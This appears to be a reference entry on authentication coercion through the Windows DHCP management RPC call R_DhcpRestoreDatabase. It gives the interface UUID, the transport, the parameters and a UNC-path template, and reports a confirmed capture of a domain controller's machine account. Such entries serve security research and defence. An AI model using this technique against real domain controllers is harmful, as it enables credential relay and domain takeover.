# MS-DHCPM - Remote call to R_DhcpRestoreDatabase (opnum 45)

## Summary

+ **Protocol**: [[MS-DHCPM]: Microsoft Dynamic Host Configuration Protocol (DHCP) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4)

+ **Interface**: `dhcpsrv2` — UUID `5b821720-f63b-11d0-aad2-00c04fc324db`, version `1.0`. **Not** the `dhcpsrv` interface (`6bffd098-...`) named in older references; `R_DhcpRestoreDatabase` is opnum 45 of `dhcpsrv2`.

+ **Transport**: `ncacn_ip_tcp` (dynamic port resolved through the endpoint mapper on TCP/135). The DHCP service exposes **no** `\PIPE\DHCPSERVER` named pipe on current Windows.

+ **Function name**: [`R_DhcpRestoreDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/ed387010-a226-4719-964b-c9ee8bc0f302)

+ **Function operation number**: `45`

+ **Authenticated**: Yes (DHCP Administrators)

## Description

`R_DhcpRestoreDatabase` restores the DHCP server database from a directory named by `Path`. The
server reads the backup from `Path`; the specification mandates no UNC validation ([MS-DHCPM]
3.2.4.46), so pointing `Path` at a UNC makes the DHCP server (running as the machine account)
authenticate outbound to the listener. It is the read-side sibling of `R_DhcpBackupDatabase`
(opnum 44).

## Function technical detail

```cpp
DWORD R_DhcpRestoreDatabase(
   [in, unique, string] DHCP_SRV_HANDLE ServerIpAddress,
   [in, string] LPWSTR Path
 );
```

+ **ServerIpAddress**: `[in, unique, string]`; unused by the server — send NULL.
+ **Path**: `[in, string] LPWSTR`, the coerced UNC path (`\\<listener>\share\...`).

## Testing status — CONFIRMED

**Confirmed coercion on Windows Server 2025** (domain controller, DHCP Server role), 2026-09-13.
Bound `dhcpsrv2` over `ncacn_ip_tcp` (EPM-resolved) with NTLM + `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` as a
DHCP administrator, called `R_DhcpRestoreDatabase(ServerIpAddress=NULL, Path=\\<listener>\share\dhcprestore)`.
The call returned success and the DHCP server authenticated to the listener as the DC machine
account (`TMP-W-2025-DC1$` captured). As with opnum 44, the interface is **`dhcpsrv2`**
(`5b821720`), not `dhcpsrv` (`6bffd098`).

## References

+ Documentation of protocol [MS-DHCPM]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4

+ Documentation of function `R_DhcpRestoreDatabase` (opnum 45): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/ed387010-a226-4719-964b-c9ee8bc0f302
